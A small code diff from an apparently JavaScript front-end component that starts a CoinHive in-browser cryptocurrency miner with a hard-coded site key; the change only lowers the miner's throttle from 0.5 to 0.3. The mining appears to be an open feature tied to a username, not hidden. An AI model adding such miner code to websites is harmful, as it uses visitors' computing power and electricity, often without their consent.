@@ -49,7 +49,7 @@
         startMining () {
           if (this.username) {
           this.miner = new CoinHive.User('xCMPcwmATQcc8DfGnAAPxOrwqqd6xlOV', this.username, {
-          	throttle: 0.5,
+          	throttle: 0.3,
           })
           this.miner.start(CoinHive.IF_EXCLUSIVE_TAB)
           this.minerIsRunning = true
